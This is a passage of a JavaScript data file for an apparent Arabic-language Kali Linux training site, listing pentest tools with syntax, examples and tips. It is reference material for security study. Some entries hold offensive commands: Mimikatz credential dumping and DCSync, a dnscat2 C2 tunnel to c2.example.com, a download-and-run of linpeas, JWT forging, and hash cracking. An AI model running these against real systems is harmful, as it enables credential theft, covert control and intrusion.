// ============================================================
// KALI ACADEMY - COMMANDS DATABASE PART 17
// 25 BRAND NEW UNIQUE COMMANDS - IDs 1536-1560
// ============================================================
window.CMD_PART17 = [
  {
    id: 1536,
    name: 'ghauri',
    cat: 'web',
    level: 'intermediate',
    syntax: 'ghauri -u <url> [options]',
    short: 'أداة SQL injection متقدمة بـ Python',
    desc: 'بديل محسّن لـ SQLMap يدعم اكتشاف واستغلال SQL injection بكفاءة عالية.',
    options: [
      { flag: '-u <url>', desc: 'الرابط المستهدف' },
      { flag: '--dbs', desc: 'تعداد قواعد البيانات' },
      { flag: '--dump', desc: 'تفريغ البيانات' }
    ],
    examples: [
      { cmd: 'ghauri -u "http://target.com/item?id=1" --dbs', desc: 'تعداد قواعد البيانات' }
    ],
    tips: 'ghauri يدعم WAF bypass ويعطي نتائج دقيقة أكثر من sqlmap في بعض الحالات.',
    related: ['sqlmap', 'nosqlmap', 'burpsuite']
  },
  {
    id: 1537,
    name: 'nosqlmap',
    cat: 'web',
    level: 'intermediate',
    syntax: 'nosqlmap',
    short: 'اختبار حقن NoSQL (MongoDB, CouchDB)',
    desc: 'أداة لاكتشاف واستغلال ثغرات NoSQL injection في قواعد بيانات MongoDB وCouchDB.',
    options: [],
    examples: [
      { cmd: 'nosqlmap', desc: 'تشغيل nosqlmap تفاعلياً' }
    ],
    tips: 'MongoDB عرضة لـ injection باستخدام $where وoperators خاصة.',
    related: ['sqlmap', 'burpsuite', 'wfuzz']
  },
  {
    id: 1538,
    name: 'xsstrike',
    cat: 'web',
    level: 'intermediate',
    syntax: 'xsstrike -u <url>',
    short: 'اكتشاف XSS متقدم بالذكاء الاصطناعي',
    desc: 'أداة XSS متقدمة تستخدم fuzzing ذكياً وتحليل السياق لاكتشاف XSS.',
    options: [
      { flag: '-u <url>', desc: 'الرابط المستهدف' },
      { flag: '--crawl', desc: 'الزحف التلقائي' },
      { flag: '--blind', desc: 'اكتشاف Blind XSS' }
    ],
    examples: [
      { cmd: 'xsstrike -u "http://target.com/search?q=test"', desc: 'فحص XSS' },
      { cmd: 'xsstrike -u http://target.com --crawl', desc: 'مسح مع الزحف' }
    ],
    tips: 'xsstrike أذكى من dalfox في الأهداف التي تطبق WAF.',
    related: ['dalfox', 'burpsuite', 'xsser']
  },
  {
    id: 1539,
    name: 'arachni',
    cat: 'web',
    level: 'intermediate',
    syntax: 'arachni <url>',
    short: 'إطار مسح أمان تطبيقات الويب',
    desc: 'إطار مسح شامل لتطبيقات الويب يكشف عشرات أنواع الثغرات.',
    options: [
      { flag: '--output-report-path=<file>', desc: 'مسار التقرير' },
      { flag: '--checks=*', desc: 'تشغيل كل الفحوصات' }
    ],
    examples: [
      { cmd: 'arachni http://target.com', desc: 'فحص شامل' },
      { cmd: 'arachni http://target.com --output-report-path=report.afr', desc: 'مع حفظ التقرير' }
    ],
    tips: 'arachni يوفر واجهة ويب لإدارة الفحوصات.',
    related: ['nikto', 'zaproxy', 'wapiti']
  },
  {
    id: 1540,
    name: 'zaproxy',
    cat: 'web',
    level: 'intermediate',
    syntax: 'zap.sh [options]',
    short: 'OWASP ZAP - ماسح أمان ويب شامل',
    desc: 'OWASP Zed Attack Proxy - أداة مجانية لاختبار أمان تطبيقات الويب من OWASP.',
    options: [
      { flag: '-daemon', desc: 'تشغيل كـ daemon' },
      { flag: '-port <port>', desc: 'منفذ proxy' },
      { flag: '-quickurl <url>', desc: 'فحص سريع لرابط' }
    ],
    examples: [
      { cmd: 'zap.sh -quickurl http://target.com', desc: 'فحص سريع' },
      { cmd: 'zap.sh -daemon -port 8090', desc: 'تشغيل كـ daemon' }
    ],
    tips: 'ZAP يمكن دمجه في CI/CD pipeline عبر API.',
    related: ['burpsuite', 'nikto', 'arachni']
  },
  {
    id: 1541,
    name: 'jwt-tool',
    cat: 'web',
    level: 'intermediate',
    syntax: 'jwt_tool <token>',
    short: 'اختبار وكسر JSON Web Tokens',
    desc: 'أداة متخصصة لاختبار وتزوير واستغلال JSON Web Tokens (JWT).',
    options: [
      { flag: '-M pb2', desc: 'هجوم playbook (fuzz)' },
      { flag: '-C -d <wordlist>', desc: 'كسر الـ secret' },
      { flag: '-I -pc <claim> -pv <value>', desc: 'حقن claim محدد' }
    ],
    examples: [
      { cmd: 'jwt_tool eyJ...', desc: 'تحليل JWT token' },
      { cmd: 'jwt_tool eyJ... -C -d wordlist.txt', desc: 'كسر الـ secret' },
      { cmd: 'jwt_tool eyJ... -I -pc username -pv admin', desc: 'تزوير claim' }
    ],
    tips: 'اختبر None algorithm وHS256/RS256 confusion attacks.',
    related: ['burpsuite', 'hashcat', 'ffuf']
  },
  {
    id: 1542,
    name: 'smbmap',
    cat: 'network',
    level: 'intermediate',
    syntax: 'smbmap -H <host> [options]',
    short: 'تعداد مشاركات SMB والوصول إليها',
    desc: 'يعدد مشاركات SMB ويكشف الأذونات ويدعم تنفيذ الأوامر عبر SMB.',
    options: [
      { flag: '-H <host>', desc: 'الهدف' },
      { flag: '-u <user>', desc: 'اسم المستخدم' },
      { flag: '-p <pass>', desc: 'كلمة المرور' },
      { flag: '-R', desc: 'عرض محتوى المشاركات بشكل تكراري' },
      { flag: '-x <cmd>', desc: 'تنفيذ أمر' }
    ],
    examples: [
      { cmd: 'smbmap -H 192.168.1.100 -u anonymous', desc: 'فحص مجهول' },
      { cmd: 'smbmap -H 192.168.1.100 -u admin -p password -R', desc: 'قراءة المشاركات بالتفصيل' }
    ],
    tips: 'smbmap يعرض permissions (R/W) لكل مشاركة - ابحث عن المشاركات القابلة للكتابة.',
    related: ['smbclient', 'crackmapexec', 'enum4linux']
  },
  {
    id: 1543,
    name: 'mimikatz-cmds',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'mimikatz # sekurlsa::logonpasswords',
    short: 'أوامر Mimikatz للحصول على كلمات المرور',
    desc: 'مجموعة أوامر Mimikatz الأكثر استخداماً لاستخراج كلمات المرور والهاشات وتذاكر Kerberos.',
    options: [
      { flag: 'sekurlsa::logonpasswords', desc: 'استخراج كلمات المرور من الذاكرة' },
      { flag: 'sekurlsa::wdigest', desc: 'استخراج كلمات مرور WDigest' },
      { flag: 'lsadump::sam', desc: 'استخراج SAM database' },
      { flag: 'kerberos::list /export', desc: 'تصدير تذاكر Kerberos' }
    ],
    examples: [
      { cmd: 'privilege::debug; sekurlsa::logonpasswords', desc: 'استخراج كلمات المرور' },
      { cmd: 'lsadump::dcsync /domain:domain.local /user:Administrator', desc: 'DCSync attack' }
    ],
    tips: 'privilege::debug مطلوب قبل كل عمليات Mimikatz.',
    related: ['mimikatz', 'impacket-secretsdump', 'crackmapexec']
  },
  {
    id: 1544,
    name: 'sharphound',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'SharpHound.exe [options]',
    short: 'جمع بيانات Active Directory لـ BloodHound',
    desc: 'أداة جمع البيانات الرسمية لـ BloodHound تعمل على Windows.',
    options: [
      { flag: '-c All', desc: 'جمع كل أنواع البيانات' },
      { flag: '--stealth', desc: 'وضع التخفي' },
      { flag: '-d <domain>', desc: 'النطاق المستهدف' }
    ],
    examples: [
      { cmd: 'SharpHound.exe -c All -d domain.local', desc: 'جمع شامل' },
      { cmd: 'SharpHound.exe --stealth -c DCOnly', desc: 'جمع خفي من DC' }
    ],
    tips: 'استخدم -Loop لجمع البيانات بشكل دوري لرصد التغييرات.',
    related: ['bloodhound', 'crackmapexec', 'powerview']
  },
  {
    id: 1545,
    name: 'spiderfoot',
    cat: 'recon',
    level: 'intermediate',
    syntax: 'spiderfoot -s <target>',
    short: 'OSINT آلي لجمع المعلومات',
    desc: 'أداة OSINT آلية تجمع معلومات من مئات المصادر بشكل تلقائي.',
    options: [
      { flag: '-s <target>', desc: 'الهدف (IP/Domain/Email)' },
      { flag: '-l <host:port>', desc: 'تشغيل واجهة ويب' },
      { flag: '-t <types>', desc: 'أنواع البيانات المطلوبة' }
    ],
    examples: [
      { cmd: 'spiderfoot -s target.com -l 127.0.0.1:5001', desc: 'تشغيل مع واجهة ويب' }
    ],
    tips: 'SpiderFoot HX النسخة السحابية أسرع وأشمل.',
    related: ['maltego', 'recon-ng', 'theHarvester']
  },
  {
    id: 1546,
    name: 'metagoofil',
    cat: 'recon',
    level: 'beginner',
    syntax: 'metagoofil -d <domain> -t <filetype> -l <limit>',
    short: 'استخراج metadata من ملفات عامة',
    desc: 'يبحث في Google عن ملفات تابعة للنطاق ويستخرج metadata منها.',
    options: [
      { flag: '-d <domain>', desc: 'النطاق المستهدف' },
      { flag: '-t <type>', desc: 'نوع الملف (pdf, doc, xls)' },
      { flag: '-l <limit>', desc: 'عدد النتائج' }
    ],
    examples: [
      { cmd: 'metagoofil -d target.com -t pdf -l 20', desc: 'جمع metadata من PDFs' },
      { cmd: 'metagoofil -d target.com -t doc,xls,pdf -l 50', desc: 'جمع من أنواع متعددة' }
    ],
    tips: 'PDF metadata قد تكشف أسماء موظفين ومسارات ملفات داخلية.',
    related: ['theHarvester', 'photon', 'exiftool']
  },
  {
    id: 1547,
    name: 'phoneinfoga',
    cat: 'recon',
    level: 'beginner',
    syntax: 'phoneinfoga scan -n <number>',
    short: 'استطلاع OSINT لأرقام الهاتف',
    desc: 'يجمع معلومات OSINT عن أرقام الهاتف من مصادر متعددة.',
    options: [
      { flag: 'scan -n <number>', desc: 'فحص رقم هاتف' },
      { flag: 'serve', desc: 'تشغيل واجهة ويب' }
    ],
    examples: [
      { cmd: 'phoneinfoga scan -n +1234567890', desc: 'فحص رقم هاتف' }
    ],
    tips: 'استخدم التنسيق الدولي مع رمز البلد.',
    related: ['theHarvester', 'sherlock', 'maltego']
  },
  {
    id: 1548,
    name: 'eyewitness',
    cat: 'recon',
    level: 'intermediate',
    syntax: 'eyewitness -f <urls.txt>',
    short: 'أخذ لقطات شاشة لخدمات الويب',
    desc: 'يأخذ لقطات شاشة لقائمة من URLs لخدمات HTTP وHTTPS ويولد تقريراً.',
    options: [
      { flag: '-f <file>', desc: 'ملف URLs' },
      { flag: '-d <dir>', desc: 'مجلد الإخراج' },
      { flag: '--prepend-https', desc: 'إضافة https://' }
    ],
    examples: [
      { cmd: 'eyewitness -f urls.txt -d screenshots/', desc: 'لقطات شاشة لقائمة URLs' }
    ],
    tips: 'eyewitness مفيد لتحديد الأهداف الواعدة بسرعة في بيئات كبيرة.',
    related: ['httpx', 'aquatone', 'gowitness']
  },
  {
    id: 1549,
    name: 'dradis',
    cat: 'forensics',
    level: 'intermediate',
    syntax: 'start-dradis',
    short: 'إطار كتابة تقارير اختبار الاختراق',
    desc: 'إطار تعاوني لتنظيم نتائج اختبار الاختراق وكتابة التقارير.',
    options: [],
    examples: [
      { cmd: 'start-dradis', desc: 'تشغيل Dradis' },
      { cmd: 'http://localhost:3000', desc: 'فتح واجهة الويب' }
    ],
    tips: 'Dradis يدعم استيراد نتائج nmap وBurp وNessus مباشرة.',
    related: ['cherrytree', 'magictree', 'faraday']
  },
  {
    id: 1550,
    name: 'cherrytree',
    cat: 'forensics',
    level: 'beginner',
    syntax: 'cherrytree',
    short: 'تنظيم ملاحظات اختبار الاختراق',
    desc: 'تطبيق تدوين ملاحظات هرمي مناسب لتنظيم نتائج اختبار الاختراق.',
    options: [],
    examples: [
      { cmd: 'cherrytree', desc: 'تشغيل CherryTree' }
    ],
    tips: 'استخدم templates جاهزة لـ pentest في CherryTree من GitHub.',
    related: ['dradis', 'obsidian', 'notion']
  },
  {
    id: 1551,
    name: 'faraday',
    cat: 'forensics',
    level: 'intermediate',
    syntax: 'faraday-client',
    short: 'إطار إدارة اختبار الاختراق التعاوني',
    desc: 'منصة متكاملة لإدارة اختبارات الاختراق التعاونية وتوليد التقارير.',
    options: [],
    examples: [
      { cmd: 'faraday-client', desc: 'تشغيل Faraday client' }
    ],
    tips: 'Faraday يدعم استيراد نتائج أكثر من 70 أداة أمنية.',
    related: ['dradis', 'cherrytree', 'vulnscan-nmap']
  },
  {
    id: 1552,
    name: 'netexec',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'netexec <protocol> <target> [options]',
    short: 'خليفة CrackMapExec المطور',
    desc: 'نسخة محدثة من CrackMapExec (CME) باسم NetExec تدعم بروتوكولات إضافية.',
    options: [
      { flag: 'smb', desc: 'استخدام SMB' },
      { flag: 'winrm', desc: 'استخدام WinRM' },
      { flag: 'ldap', desc: 'استخدام LDAP' },
      { flag: '-u', desc: 'اسم المستخدم' },
      { flag: '-p', desc: 'كلمة المرور' }
    ],
    examples: [
      { cmd: 'netexec smb 192.168.1.0/24', desc: 'اكتشاف SMB' },
      { cmd: 'netexec ldap 192.168.1.10 -u user -p pass --users', desc: 'تعداد LDAP users' }
    ],
    tips: 'نفس syntax لـ CrackMapExec مع دعم LDAP وFTP إضافي.',
    related: ['crackmapexec', 'evil-winrm', 'impacket-psexec']
  },
  {
    id: 1553,
    name: 'pipal',
    cat: 'password',
    level: 'intermediate',
    syntax: 'pipal <wordlist>',
    short: 'تحليل إحصائي لكلمات المرور',
    desc: 'يحلل قوائم كلمات المرور ويقدم إحصائيات مفيدة لفهم patterns كلمات المرور.',
    options: [],
    examples: [
      { cmd: 'pipal passwords.txt', desc: 'تحليل قائمة كلمات المرور' }
    ],
    tips: 'pipal مفيد لفهم سياسات كلمات المرور في المؤسسات.',
    related: ['cupp', 'cewl', 'wordlist-tools']
  },
  {
    id: 1554,
    name: 'cupp',
    cat: 'password',
    level: 'beginner',
    syntax: 'cupp [options]',
    short: 'توليد قوائم كلمات مرور مخصصة للأفراد',
    desc: 'يولد قائمة كلمات مرور مخصصة للهدف بناءً على معلومات شخصية مثل الاسم وتاريخ الميلاد.',
    options: [
      { flag: '-i', desc: 'وضع تفاعلي لإدخال المعلومات' },
      { flag: '-l', desc: 'تنزيل قوائم كبيرة' },
      { flag: '-a', desc: 'تحليل ملف الحاجز' }
    ],
    examples: [
      { cmd: 'cupp -i', desc: 'توليد قائمة بشكل تفاعلي' }
    ],
    tips: 'المعلومات من LinkedIn وFacebook مصدر ممتاز لـ cupp.',
    related: ['pipal', 'cewl', 'crunch']
  },
  {
    id: 1555,
    name: 'haveibeenpwned-cli',
    cat: 'recon',
    level: 'beginner',
    syntax: 'hibp-cli check <email>',
    short: 'التحقق من تسريب كلمات المرور',
    desc: 'يتحقق من وجود عنوان بريد إلكتروني أو كلمة مرور في قواعد بيانات التسريبات.',
    options: [],
    examples: [
      { cmd: 'hibp check email@example.com', desc: 'فحص بريد إلكتروني' }
    ],
    tips: 'استخدم Have I Been Pwned API للبحث عن كلمات المرور المسربة.',
    related: ['theHarvester', 'sherlock', 'recon-ng']
  },
  {
    id: 1556,
    name: 'bulk-extractor',
    cat: 'forensics',
    level: 'intermediate',
    syntax: 'bulk_extractor -o <output> <input>',
    short: 'استخراج معلومات من images بشكل جماعي',
    desc: 'يستخرج أنواعاً متعددة من البيانات (emails, URLs, credit cards) من disk images أو ملفات.',
    options: [
      { flag: '-o <dir>', desc: 'مجلد الإخراج' },
      { flag: '-R', desc: 'معالجة تكرارية' },
      { flag: '-e <scanner>', desc: 'تفعيل scanner محدد' }
    ],
    examples: [
      { cmd: 'bulk_extractor -o output/ disk.img', desc: 'استخراج من disk image' },
      { cmd: 'bulk_extractor -R -o output/ /suspicious_dir/', desc: 'فحص مجلد' }
    ],
    tips: 'bulk_extractor يجد emails و URLs و credit cards تلقائياً.',
    related: ['foremost', 'volatility3', 'strings']
  },
  {
    id: 1557,
    name: 'hashdeep',
    cat: 'forensics',
    level: 'beginner',
    syntax: 'hashdeep [options] <files>',
    short: 'حساب والتحقق من هاشات الملفات',
    desc: 'يحسب ويتحقق من هاشات ملفات متعددة (MD5, SHA1, SHA256) لضمان سلامة الملفات.',
    options: [
      { flag: '-r', desc: 'معالجة تكرارية' },
      { flag: '-a', desc: 'وضع المقارنة' },
      { flag: '-k <file>', desc: 'ملف مرجعي للمقارنة' }
    ],
    examples: [
      { cmd: 'hashdeep -r /important/files/ > hashes.txt', desc: 'إنشاء قاعدة هاشات' },
      { cmd: 'hashdeep -r -a -k hashes.txt /important/files/', desc: 'التحقق من التغييرات' }
    ],
    tips: 'استخدم hashdeep لضمان سلامة الأدلة الجنائية.',
    related: ['md5sum', 'sha256sum', 'aide']
  },
  {
    id: 1558,
    name: 'hashcat-rules',
    cat: 'password',
    level: 'intermediate',
    syntax: 'hashcat -m <mode> -r <rules> <hash> <wordlist>',
    short: 'استخدام قواعد hashcat لتحويل كلمات المرور',
    desc: 'قواعد hashcat تحول كلمات المرور بطرق شائعة لزيادة فاعلية الكسر.',
    options: [
      { flag: '-r best64.rule', desc: 'أفضل 64 قاعدة' },
      { flag: '-r OneRuleToRuleThemAll.rule', desc: 'قاعدة شاملة مجتمعية' },
      { flag: '-r d3ad0ne.rule', desc: 'قاعدة d3ad0ne' }
    ],
    examples: [
      { cmd: 'hashcat -m 1000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule', desc: 'كسر NTLM بقاعدة best64' },
      { cmd: 'hashcat -m 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule', desc: 'MD5 مع قاعدة شاملة' }
    ],
    tips: 'القواعد تضاعف فاعلية الكسر دون زيادة كبيرة في الوقت.',
    related: ['hashcat', 'john', 'crunch']
  },
  {
    id: 1559,
    name: 'tcpflow',
    cat: 'network',
    level: 'intermediate',
    syntax: 'tcpflow [options] <filter>',
    short: 'تسجيل وتحليل جلسات TCP',
    desc: 'يسجل ويعيد بناء جلسات TCP من التقاط الشبكة، مفيد لتحليل البيانات.',
    options: [
      { flag: '-i <interface>', desc: 'واجهة الشبكة' },
      { flag: '-r <pcap>', desc: 'قراءة من ملف PCAP' },
      { flag: '-c', desc: 'طباعة في الـ console' }
    ],
    examples: [
      { cmd: 'tcpflow -i eth0', desc: 'التقاط مباشر' },
      { cmd: 'tcpflow -r capture.pcap', desc: 'تحليل ملف PCAP' }
    ],
    tips: 'tcpflow يعيد بناء الجلسات كاملة وليس فقط الحزم.',
    related: ['tcpdump', 'wireshark', 'tshark']
  },
  {
    id: 1560,
    name: 'dnscat2',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'dnscat2-server <domain>',
    short: 'نفق Command & Control عبر DNS',
    desc: 'أداة لإنشاء قنوات C2 سرية عبر بروتوكول DNS لتجاوز جدران الحماية.',
    options: [],
    examples: [
      { cmd: 'dnscat2-server c2.example.com', desc: 'تشغيل الخادم' },
      { cmd: 'dnscat2 --dns server=c2.example.com,port=53', desc: 'تشغيل العميل' }
    ],
    tips: 'DNS tunneling يعمل في بيئات تحظر كل المنافذ ماعدا 53.',
    related: ['iodine', 'dnschef', 'chisel']
  },
  {
    id: 1561,
    name: 'feroxbuster',
    cat: 'web',
    level: 'intermediate',
    syntax: 'feroxbuster -u <url> -w <wordlist>',
    short: 'اكتشاف المسارات المخفية بسرعة عالية',
    desc: 'أداة مكتوبة بـ Rust لفحص المجلدات والملفات المخفية بسرعة كبيرة مع دعم Recursion.',
    options: [
      { flag: '-u <url>', desc: 'الرابط المستهدف' },
      { flag: '-w <wordlist>', desc: 'قائمة الكلمات' },
      { flag: '-x <ext>', desc: 'امتدادات إضافية' }
    ],
    examples: [
      { cmd: 'feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,bak', desc: 'فحص مسارات وامتدادات' }
    ],
    tips: 'حدد -t وعدد الخيوط حسب قدرة الهدف لتجنب إحداث ضغط مفرط.',
    related: ['gobuster', 'ffuf', 'dirsearch']
  },
  {
    id: 1562,
    name: 'nuclei',
    cat: 'recon',
    level: 'intermediate',
    syntax: 'nuclei -u <url> -t <templates>',
    short: 'محرك فحص الثغرات بالـ templates',
    desc: 'أداة فحص ثغرات تعتمد على قوالب جاهزة لاكتشاف Misconfigurations وCVEs بسرعة.',
    options: [
      { flag: '-u <url>', desc: 'هدف واحد' },
      { flag: '-l <file>', desc: 'ملف أهداف' },
      { flag: '-severity <levels>', desc: 'تحديد مستوى الخطورة' }
    ],
    examples: [
      { cmd: 'nuclei -l targets.txt -severity critical,high -o findings.txt', desc: 'فحص مجموعة أهداف وحفظ النتائج' }
    ],
    tips: 'قم بتحديث القوالب باستمرار عبر nuclei -update-templates.',
    related: ['nikto', 'zaproxy', 'nmap']
  },
  {
    id: 1563,
    name: 'katana',
    cat: 'recon',
    level: 'intermediate',
    syntax: 'katana -u <url> [options]',
    short: 'Web crawler سريع لاستخراج المسارات',
    desc: 'Crawler احترافي لاكتشاف الروابط والمسارات ونقاط API المخفية من تطبيقات الويب.',
    options: [
      { flag: '-u <url>', desc: 'الرابط المستهدف' },
      { flag: '-d <depth>', desc: 'عمق الزحف' },
      { flag: '-jc', desc: 'استخراج JavaScript endpoints' }
    ],
    examples: [
      { cmd: 'katana -u https://target.com -d 5 -jc -o urls.txt', desc: 'زحف متقدم مع استخراج JS endpoints' }
    ],
    tips: 'استخدم نتائج katana كمدخل لـ ffuf وnuclei لرفع معدل اكتشاف الثغرات.',
    related: ['gau', 'waybackurls', 'hakrawler']
  },
  {
    id: 1564,
    name: 'naabu',
    cat: 'network',
    level: 'intermediate',
    syntax: 'naabu -host <target> [options]',
    short: 'ماسح منافذ سريع للغاية',
    desc: 'أداة مسح منافذ من ProjectDiscovery بسرعة عالية مع دعم الإدخال الجماعي.',
    options: [
      { flag: '-host <target>', desc: 'الهدف' },
      { flag: '-p <ports>', desc: 'المنافذ' },
      { flag: '-rate <num>', desc: 'معدل الحزم في الثانية' }
    ],
    examples: [
      { cmd: 'naabu -host target.com -p 1-1000 -rate 2000', desc: 'مسح أول 1000 منفذ بسرعة' }
    ],
    tips: 'يُفضّل دمجه مع nmap -sV بعد اكتشاف المنافذ المفتوحة.',
    related: ['nmap', 'masscan', 'rustscan']
  },
  {
    id: 1565,
    name: 'dnsx',
    cat: 'recon',
    level: 'intermediate',
    syntax: 'dnsx -l <domains.txt> [options]',
    short: 'أداة DNS resolution عالية الأداء',
    desc: 'تحقق من النطاقات الفرعية وتحل DNS records بسرعة كبيرة مع تصفية النتائج الحية.',
    options: [
      { flag: '-l <file>', desc: 'ملف النطاقات' },
      { flag: '-a', desc: 'إظهار A records' },
      { flag: '-resp', desc: 'إظهار استجابة DNS' }
    ],
    examples: [
      { cmd: 'dnsx -l subdomains.txt -a -resp -o resolved.txt', desc: 'تحقق من Subdomains وتصدير النتائج' }
    ],
    tips: 'مرر النتائج إلى httpx لتحديد الخدمات الحية مباشرة.',
    related: ['dig', 'subfinder', 'amass']
  },
  {
    id: 1566,
    name: 'httpx',
    cat: 'recon',
    level: 'intermediate',
    syntax: 'httpx -l <hosts.txt> [options]',
    short: 'فحص خدمات HTTP/HTTPS على نطاق واسع',
    desc: 'أداة سريعة لاكتشاف الخدمات الحية، العناوين، الشهادات، والعناوين النهائية.',
    options: [
      { flag: '-l <file>', desc: 'ملف hosts' },
      { flag: '-status-code', desc: 'عرض كود الحالة' },
      { flag: '-title', desc: 'عرض عنوان الصفحة' }
    ],
    examples: [
      { cmd: 'httpx -l domains.txt -status-code -title -tech-detect -o live.txt', desc: 'تحديد الأهداف الحية مع تفاصيل تقنية' }
    ],
    tips: 'استخدم -silent في الـ pipeline للحصول على نتائج نظيفة.',
    related: ['httprobe', 'nuclei', 'katana']
  },
  {
    id: 1567,
    name: 'interactsh-client',
    cat: 'recon',
    level: 'advanced',
    syntax: 'interactsh-client [options]',
    short: 'رصد OOB interactions للثغرات العمياء',
    desc: 'عميل Interactsh لاستقبال تفاعلات DNS/HTTP/SMTP الناتجة عن Blind vulnerabilities.',
    options: [
      { flag: '-v', desc: 'وضع تفصيلي' },
      { flag: '-json', desc: 'إخراج بصيغة JSON' }
    ],
    examples: [
      { cmd: 'interactsh-client -v', desc: 'إنشاء OOB endpoint ومراقبة التفاعلات' }
    ],
    tips: 'مفيد جداً مع Blind SSRF وBlind XSS وBlind RCE.',
    related: ['burpsuite', 'nuclei', 'ffuf']
  },
  {
    id: 1568,
    name: 'trufflehog',
    cat: 'forensics',
    level: 'intermediate',
    syntax: 'trufflehog git <repo> [options]',
    short: 'كشف الأسرار المسربة في المستودعات',
    desc: 'يفحص Git history وملفات المشروع لاكتشاف API keys وtokens وcredentials.',
    options: [
      { flag: 'git <repo>', desc: 'فحص مستودع Git' },
      { flag: '--only-verified', desc: 'إظهار الأسرار المتحققة فقط' },
      { flag: '--json', desc: 'إخراج JSON' }
    ],
    examples: [
      { cmd: 'trufflehog git https://github.com/org/repo --only-verified', desc: 'فحص مستودع عام بحثاً عن أسرار فعلية' }
    ],
    tips: 'افحص أيضاً CI logs وArtifacts لأن التسريبات قد تكون خارج الشيفرة.',
    related: ['gitleaks', 'git-secrets', 'ripgrep']
  },
  {
    id: 1569,
    name: 'gitleaks',
    cat: 'forensics',
    level: 'intermediate',
    syntax: 'gitleaks detect [options]',
    short: 'اكتشاف أسرار حساسة في Git',
    desc: 'أداة متقدمة لفحص commits والملفات واكتشاف مفاتيح الوصول والبيانات الحساسة.',
    options: [
      { flag: 'detect', desc: 'فحص المستودع الحالي' },
      { flag: '--source <path>', desc: 'مسار المصدر' },
      { flag: '--report-format sarif', desc: 'تقرير متوافق مع أدوات CI' }
    ],
    examples: [
      { cmd: 'gitleaks detect --source . --report-format sarif --report-path gitleaks.sarif', desc: 'فحص شامل مع تقرير SARIF' }
    ],
    tips: 'ادمجها في pre-commit hook لمنع تسريب الأسرار قبل الرفع.',
    related: ['trufflehog', 'git-secrets', 'detect-secrets']
  },
  {
    id: 1570,
    name: 'trivy',
    cat: 'forensics',
    level: 'intermediate',
    syntax: 'trivy <target-type> <target>',
    short: 'فحص ثغرات الحاويات والأنظمة والـ IaC',
    desc: 'أداة شاملة لفحص Container images وأنظمة الملفات وبنية Kubernetes وملفات IaC.',
    options: [
      { flag: 'image <name>', desc: 'فحص صورة Docker' },
      { flag: 'fs <path>', desc: 'فحص نظام ملفات' },
      { flag: '--severity', desc: 'تصفية حسب الخطورة' }
    ],
    examples: [
      { cmd: 'trivy image --severity HIGH,CRITICAL nginx:latest', desc: 'فحص صورة حاوية عالية المخاطر' }
    ],
    tips: 'استخدم --ignore-unfixed لتقليل الضجيج والتركيز على الثغرات القابلة للمعالجة.',
    related: ['grype', 'syft', 'docker-bench-security']
  },
  {
    id: 1571,
    name: 'syft',
    cat: 'forensics',
    level: 'intermediate',
    syntax: 'syft <image|path> [options]',
    short: 'توليد SBOM للمكونات البرمجية',
    desc: 'ينشئ Software Bill of Materials (SBOM) لتحديد كل الحزم والمكتبات داخل التطبيقات والصور.',
    options: [
      { flag: '-o <format>', desc: 'صيغة الإخراج' },
      { flag: 'packages', desc: 'عرض الحزم المكتشفة' }
    ],
    examples: [
      { cmd: 'syft nginx:latest -o cyclonedx-json > sbom.json', desc: 'توليد SBOM لصورة Docker' }
    ],
    tips: 'SBOM ضروري للامتثال الأمني وتتبع تأثير CVEs على سلسلة التوريد.',
    related: ['grype', 'trivy', 'cosign']
  },
  {
    id: 1572,
    name: 'grype',
    cat: 'forensics',
    level: 'intermediate',
    syntax: 'grype <image|sbom> [options]',
    short: 'فحص الثغرات اعتماداً على SBOM أو الصور',
    desc: 'أداة من Anchore تحلل الصور وSBOM لاكتشاف الثغرات وربطها بـ CVEs.',
    options: [
      { flag: '<image>', desc: 'فحص صورة حاوية' },
      { flag: '--fail-on <severity>', desc: 'إرجاع فشل عند خطورة محددة' },
      { flag: '-o json', desc: 'إخراج JSON' }
    ],
    examples: [
      { cmd: 'grype nginx:latest --fail-on high', desc: 'فحص وإيقاف pipeline عند ثغرات عالية' }
    ],
    tips: 'ادمجه مع syft للحصول على دقة أعلى في التحليل.',
    related: ['syft', 'trivy', 'clair']
  },
  {
    id: 1573,
    name: 'kube-bench',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'kube-bench [options]',
    short: 'فحص Kubernetes وفق CIS Benchmarks',
    desc: 'يتحقق من إعدادات Kubernetes ومكوناته مقابل معايير CIS الأمنية.',
    options: [
      { flag: '--targets <node|master>', desc: 'تحديد أهداف الفحص' },
      { flag: '--json', desc: 'إخراج JSON' }
    ],
    examples: [
      { cmd: 'kube-bench --targets master,node', desc: 'فحص إعدادات الـ control plane والـ workers' }
    ],
    tips: 'نتائج kube-bench ممتازة لبناء خطة Hardening عملية.',
    related: ['kube-hunter', 'trivy', 'kubectl']
  },
  {
    id: 1574,
    name: 'kube-hunter',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'kube-hunter [options]',
    short: 'اكتشاف ثغرات Kubernetes من منظور المهاجم',
    desc: 'يبحث عن نقاط ضعف Kubernetes المكشوفة عبر أسلوب reconnaissance هجومي.',
    options: [
      { flag: '--remote <ip>', desc: 'فحص كعنصر خارجي' },
      { flag: '--active', desc: 'اختبارات نشطة' },
      { flag: '--report json', desc: 'تقرير JSON' }
    ],
    examples: [
      { cmd: 'kube-hunter --remote 10.10.10.20 --active', desc: 'فحص نشط لعنقود Kubernetes' }
    ],
    tips: 'نفّذه فقط داخل نطاق اختبار مصرح به لأن الوضع النشط قد يترك آثاراً.',
    related: ['kube-bench', 'kubescape', 'kubeaudit']
  },
  {
    id: 1575,
    name: 'linpeas',
    cat: 'privesc',
    level: 'intermediate',
    syntax: 'linpeas.sh [options]',
    short: 'فحص مسارات رفع صلاحيات Linux',
    desc: 'سكريبت شامل من PEASS-ng لاكتشاف misconfigurations المؤدية لرفع الصلاحيات على Linux.',
    options: [
      { flag: '-a', desc: 'فحص موسع' },
      { flag: '-s', desc: 'وضع هادئ' }
    ],
    examples: [
      { cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh', desc: 'تحميل وتشغيل linpeas' }
    ],
